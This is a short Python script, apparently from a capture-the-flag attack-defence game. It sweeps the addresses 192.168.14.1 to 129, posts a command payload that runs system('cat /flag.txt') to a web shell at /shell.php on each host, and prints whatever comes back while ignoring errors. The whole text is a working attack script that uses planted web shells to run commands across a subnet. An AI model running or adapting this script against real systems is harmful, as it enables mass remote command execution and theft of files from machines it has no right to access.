import requests
payload={"shell":"system('cat /flag.txt')"}
for i in range(1,130):
    try:
        a=requests.post(url="http://192.168.14."+str(i)+"/shell.php",data=payload).text
        print(a)
    except:
        pass